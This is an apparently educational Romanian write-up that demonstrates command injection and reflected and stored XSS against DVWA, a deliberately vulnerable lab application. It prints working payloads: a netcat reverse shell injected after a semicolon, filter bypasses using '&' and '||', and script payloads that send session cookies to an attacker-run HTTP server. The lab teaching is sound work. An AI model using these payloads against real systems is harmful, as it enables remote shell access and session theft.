### Atac HTTP:
  <!-- - [Despre HTTP / HTTPS](https://github.com/Dani780-C/Cyber-security/blob/main/learn/_http_https.md) -->
  - In scop didactic, am folosit **DVWA** (Damn Vulnerable Web App). Pentru instalare si informatii aditionale: [link](https://github.com/digininja/DVWA).
  - Cuprins:
    - [Command Execution](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/http_attack.md#command-execution)
    - [XSS reflected](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/http_attack.md#xss-reflected)
    - [XSS stored](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/http_attack.md#xss-stored)  
 
## **Command Execution**
   <!-- - [Despre Command Injection](https://github.com/Dani780-C/Cyber-security/blob/main/learn/command_injection.md) -->
   - **Not hacked:** *introducem orice adresa IP (ex: 192.168.56.101)*  
   
     Raspuns:  
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_execution_normal.png)  
     Captura trafic: [download](https://github.com/Dani780-C/Cyber-security/blob/main/captures/dvwa_command_execution_low_nothacked.pcapng)  
   - **Hacked:**  
   
     **LOW**  
        - Sursa codului PHP:  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/source_code_low_command_execution.png)  
        
        Pentru ca nu avem niciun fel de validare pe input-ul form-ului, putem scrie orice adresa IP urmat de `;` sau `&&`.  
        De exemplu, executia unui reverse shell: intr-un terminal separat se va executa un listener `nc -lvp 4444`, iar in form-ul aplicatiei se va introduce `192.168.56.101; nc -e /bin/bash 192.168.56.101 4444`  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_reverse_shell.png)  
        
        Captura trafic: [download](https://github.com/Dani780-C/Cyber-security/blob/main/captures/dvwa_command_injection_reverse_shell.pcapng)  
       
     **MEDIUM**  
        - Sursa codului PHP:  
         
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_source_code_medium.png)  
        
        Codul PHP respectiv va inspecta string-ul primit din form si va scoate `;` si `&&`. Daca vom scrie `192.168.56.101; ls` nu se va executa comanda. Daca vom scrie `&` vom pune comanda `ping <adresa IP>` in background si astfel se va rula si urmatoarea comanda inlantuita in string-ul input-ului. De exemplu, vom introduce `192.168.56.101 & hostname & ls & pwd`. De asemenea, putem scrie `<orice string, dar nu o adresa IP valida> || ls`.  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_medium_1.png)  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_2.png)  
        
## **XSS (Reflected)**  
  <!-- - [Despre XSS](https://github.com/Dani780-C/Cyber-security/blob/main/learn/xss.md) -->
  - **Hacked:**  
    
    **LOW**
      - Sursa codului PHP:

      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_xss_reflected_low.png)  
      
      Nu avem validare pe string-ul introdus de user. Putem folosi tag-ul `<script></script>` pentru a injecta cod.  
      Intr-un terminal ne vom rula un server http pe portul 4444: `python -m http.server 4444`.  
      In aplicatia de pe masina Kali vom scrie in form `<script>window.location='http://192.168.56.101:4444/?cookie='+document.cookie</script>` pentru a ne redirectiona pagina catre `http://192.168.56.101:4444` si pentru a ne trimite cookie-urile user-ului.  
       
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_redirect_page_to_kali.png)  
      
    **MEDIUM**  
       - Sursa codului PHP:  

       ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_source_code_medium_xss_reflected.png)  
       
       Urmatorul cod va scoate toate aparitiile string-ului `<script>` din input.  
       Pentru a putea injecta cod pentru a fi rulat, putem inlocui `<script>` cu `<SCRIPT>` sau `<script>` cu `<scr<script>ipt>`.  
       Spre exemplu, putem injecta: `<SCRIPT>alert(document.cookie)</script>` sau `<scr<script>ipt>alert(document.cookie)</script>`.  
       
       ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_xss_reflected_medium_hacked.png)  

## **XSS (Stored)**  
  <!-- - [Despre XSS](https://github.com/Dani780-C/Cyber-security/blob/main/learn/xss.md) -->
  - **Hacked:**

    **LOW**  
      - Sursa codului PHP:  

      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_stored_xss_source_code_low.png)  
      
      Nu este nicio validare pe string-ul din form.  
      Intr-un terminal ne vom rula un server http pe portul 4444: `python -m http.server 4444`.  
      In aplicatia de pe masina Kali vom scrie in form in campul message `<script>window.location='http://192.168.56.101:4444/?cookie='+document.cookie</script>` pentru a ne redirectiona pagina catre `http://192.168.56.101:4444` si pentru a ne trimite cookie-urile user-ului.  
      Pe masina cu Windows 11, daca un user acceseaza pagina cu XSS stored, codul i se va executa si lui, iar pagina lui va fi redirectionata la `http://192.168.56.101:4444`.  
      
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_xss_stored_windows11_cookie.png)  
